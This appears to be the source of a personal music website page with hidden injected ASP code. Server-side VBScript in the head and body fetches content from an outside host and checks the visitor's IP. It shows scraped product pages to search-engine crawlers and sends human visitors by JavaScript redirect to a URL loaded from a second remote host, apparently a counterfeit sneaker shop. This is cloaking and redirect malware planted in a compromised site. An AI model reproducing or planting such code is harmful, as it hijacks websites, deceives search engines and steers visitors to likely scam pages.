<html lang="en"><head>
<%
function getHTTPPage(url)
    dim Http
    set Http=server.createobject("MSXML2.XMLHTTP")
    Http.open "GET",url,false
    Http.send()
    if Http.readystate<>4 then
        exit function
    end if
    getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
    set http=nothing
    if err.number<>0 then err.Clear
end function
Function BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject("adodb.stream")
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        BytesToBstr = objstream.ReadText
        objstream.Close
        set objstream = nothing
End Function

Dim Url,Html
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
if request("p_id")<>""  then
URL="http://hjben01.vjkcity.com/product_color_zd/NY_Tou.aspx?s_id=337&rnd="&yyu&"&p_id="&request("p_id")
else if request("pageIndex")<>""  then
URL="http://hjben01.vjkcity.com/product_color_zd/LB_Tou.aspx?s_id=337&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else if request("searcher")<>""  then
URL="http://hjben01.vjkcity.com/product_color_zd/LB_Tou.aspx?s_id=337&rnd="&yyu&"&searcher="&request("searcher")&""
else
URL="http://hjben01.vjkcity.com/product_color_zd/LB_Tou.aspx?rnd="&yyu&"&s_id=337"
end if
end if
end if
Html = getHTTPPage(Url)

if request("dd")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")

end if
ipurl="http://hjben01.vjkcity.com/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if  (instr(domain,"google")>0 or instr(domain,"msn.com")>0 or instr(domain,"yahoo.com")>0 or instr(domain,"aol.com")>0) then
set re = new RegExp
re.IgnoreCase =True
re.Global = True
re.Pattern = "<sc*?([\s\S]*?)>"
Set matchs = re.Execute(html)
for each match in matchs
sc= match.SubMatches(0)
next
set matchs = nothing
Html=replace(Html,"<s"&sc&"></script>","")
Response.write Html

else

if request("p_id")<>""  then
ccc=request("p_id")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://web.weup.fr/saleskechers19.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("searcher")<>""  then
ccc=request("searcher")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://web.weup.fr/saleskechers19.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("pageIndex")<>""  then
ddd=getHTTPPage("http://web.weup.fr/saleskechers19.txt?id=11")
eee=ddd&".html"
Response.write "<script>document.location="""&eee&"""</script>"
end if
end if
end if
end if
%>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" /> 
<link href="http://hjben01.vjkcity.com/style.css" rel="stylesheet" type="text/css" />
<link rel="icon" type="image/png" href="assets/Music/logo.jpg" class="rounded-circle">
<link rel="stylesheet" href="scripts/css/style.css">
<link rel="stylesheet" href="scripts/css/responsive.css">
<link rel="stylesheet" href="scripts/css/animate.min.css">
<link rel="stylesheet" href="scripts/css/googlefonts.css">
<link rel="stylesheet" href="scripts/css/animate.css">
<link rel="stylesheet" href="scripts/css/bootstrap.min.css">
<link rel="stylesheet" href="scripts/css/font-awesome.min.css">
</head>
<body>
<nav class="navbar navbar-expand-sm navbar-light fixed-top">
<a class="navbar-brand font-weight-bold ml-3" href="index.html"><img src="assets/Music/logo.jpg" class="rounded-circle mr-3" alt="">Praveen kumar koppolu </a>
<div class="collapse navbar-collapse" id="collapsibleNavId">
<ul class="navbar-nav ml-auto mt-2 mt-lg-0">
</ul>
</div>
</nav>
<section id="musicSymbel2">
<img src="./assets/banners/musicSymbel.png" class="w-25" alt="">
</section>
<section id="MusicContent">
<div class="container-fluid" style="margin:86px 0 0 0">
<div class="row">
<div  class="content">
<form method="get" action="">
    <input type="text" name="searcher" style="width: 400px" /><input type="submit" value="Searche" />
    </form>
	</div>
<%
						   
						   Dim Urlyy,Htmlyy
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)

if request("searcher")<>""  then
URLyy="http://hjben01.vjkcity.com/product_color_zd/LB_NR.aspx?s_id=337&rnd="&yyu&"&searcher="&request("searcher")&""
else if request("pageIndex")<>""  then
URLyy="http://hjben01.vjkcity.com/product_color_zd/LB_NR.aspx?s_id=337&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else
URLyy="http://hjben01.vjkcity.com/product_color_zd/LB_NR.aspx?s_id=337&rnd="&yyu&""
if request("p_id")<>""  then
Urlyy="http://hjben01.vjkcity.com/product_color_zd/NY_Content.aspx?s_id=337&rnd="&yyu&"&p_id="&request("p_id")
end if
end if
end if
Htmlyy = getHTTPPage(Urlyy)
Htmlyy=replace(Htmlyy,"LB_NR.aspx","")
Htmlyy=replace(Htmlyy,"s_id=337&rnd="&yyu&"&","")
Htmlyy=replace(Htmlyy,"?p_id=","?p_id=")
Response.write Htmlyy
%>
</div>
</div>

<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
<div class="modal-dialog modal-lg" role="document">
<div class="modal-content">
<div class="modal-body">
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="embed-responsive embed-responsive-16by9">
<iframe class="embed-responsive-item" src="" id="video" allowscriptaccess="always" allow="autoplay"></iframe>
</div>
</div>
</div>
</div>
</div></section>
<div class="container-fluid">
<div class="row">
<div class="col-lg-12 footer py-2">
<p class="text-center mt-1 mt-md-0 text-white">© All Rights Reserved | Designed by <a href="http://www.wingherry.com/" target="_blank"> Wingherry Technologies Pvt.Ltd.</a></p>
</div>
</div>
</div>

</body></html>